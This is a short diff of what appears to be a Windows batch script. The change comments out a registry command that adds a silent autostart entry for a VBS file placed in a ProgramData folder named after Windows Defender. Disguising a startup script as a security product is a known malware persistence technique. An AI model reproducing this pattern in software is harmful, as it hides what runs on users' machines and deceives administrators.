@@ -82,7 +82,7 @@ set userregistryauto=YES, NEW CREATED
 
 
 if exist "%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs" (
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v WindowsDefenderSecurity /d "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent" /f
+::reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ  /v WindowsDefenderSecurity /d "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent" /f
 set pcregistryauto=YES
 )
 if not exist "%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs" (
